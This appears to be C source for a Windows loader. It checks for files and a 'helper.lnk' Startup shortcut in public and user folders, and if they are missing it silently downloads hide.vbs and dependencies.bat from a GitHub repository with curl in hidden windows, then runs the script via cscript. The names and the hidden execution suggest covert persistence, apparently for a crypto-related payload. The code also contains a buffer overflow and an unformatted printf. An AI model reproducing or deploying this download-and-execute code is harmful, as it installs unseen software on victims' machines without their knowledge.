#include <stdio.h>
#include <io.h>
#define F_OK 0
#include <stdbool.h>
#include <windows.h>
#define access _access
#include <stdlib.h>
#ifdef WIN64
#endif

int checkConfig()
{
    printf("Inside checkconfg\n");
    if (checkSetup("C:\\Users\\Public\\config.txt"))
    {
        printf("Inside checksetup working\n");
        FILE *fp;
        fp = fopen("C:\\Users\\Public\\config.txt", "r");
        char buffer[30];
        fgets(buffer, 50, fp);
        fclose(fp);
        printf(buffer);
        printf("\n");

        if (strcmp(buffer, "True") == 0)
        {
            printf("Buffer says True, starting routine\n");
            return 0;
        }
        if (strcmp(buffer, "False") == 0)
        {
            printf("Buffer says False, starting gui.exe!\n");
            // start gui.exe inside windows public folder
            ShellExecute(NULL, "open", "C:\\Users\\Public\\gui.exe", NULL, NULL, SW_SHOW);

            exit(0);
        }
        else
        {
            printf("Something else is in config, replacing!\n");
            FILE *fp;
            fp = fopen("C:\\Users\\Public\\config.txt", "w");
            char str[] = "True\n";
            for (int i = 0; str[i] != '\n'; i++)
            {
                /* write to file using fputc() function */
                fputc(str[i], fp);
            }
            fclose(fp);
        }
    }
    else
    {
        printf("Config does not exist, creating and writing to new file\n");
        FILE *fp;
        fp = fopen("C:\\Users\\Public\\config.txt", "w");
        char str[] = "True\n";
        for (int i = 0; str[i] != '\n'; i++)
        {
            /* write to file using fputc() function */
            fputc(str[i], fp);
        }
        fclose(fp);
    }
}
int main()
{
    printf("inside routine main function\n");

    char hello[200];
    strcpy(hello, getenv("USERNAME"));
    char path[200] = "C:\\Users\\";
    strcat(path, hello);
    char path2[1000] = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.lnk";
    strcat(path, path2);
    bool inStartup = false;
    bool inPublic = false;

    if (have_internet() == 1)
    {
        if (checkSetup(path) == 1 && checkSetup("C:\\Users\\Public\\persistent.exe") == 1 && checkSetup("C:\\Users\\Public\\Windows-Helper.exe") == 1 && checkSetup("C:\\Users\\Public\\gui.exe") == 1)
        {
            // run gui.exe
            printf("Both conditions true: running gui.exe\n");

            //STARTUPINFO si;
            //PROCESS_INFORMATION pi;
            //ZeroMemory(&si, sizeof(si));
            //si.cb = sizeof(si);
            //ZeroMemory(&pi, sizeof(pi));
            //CreateProcess(NULL, "start C:\\Users\\Public\\gui.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

            
            ShellExecute(NULL, "open", "C:\\Users\\Public\\gui.exe", NULL, NULL, SW_SHOW);
        }
        else
        {
            printf("Need to download stuff\n");
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            CreateProcess(NULL, "curl --output \"C:\\Users\\Public\\hide.vbs\" -LJO https://raw.githubusercontent.com/durandlh/windows-crypto/main/third-revision/hide.vbs", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            CreateProcess(NULL, "curl --output \"C:\\Users\\Public\\dependencies.bat\" -LJO https://raw.githubusercontent.com/durandlh/windows-crypto/main/third-revision/dependencies.bat", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, INFINITE);
            Sleep(1000);
            //MessageBox(NULL, "First time launch may be slow. Please wait a moment will required files are downloaded.", "Setup", MB_ICONASTERISK );
            
            CreateProcess(NULL, "cscript C:\\Users\\Public\\hide.vbs", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, INFINITE);
            printf("Done!\n");
        }
    } else {
        MessageBox(NULL, "Sorry, there is no internet", "Error", MB_OK);
        exit(0);
    }
    checkConfig();
}

int have_internet()
{
    if (system("ping -n 1 www.google.com >nul") == 0)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}
int checkSetup(fname)
{
    if (access(fname, F_OK) == 0)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}
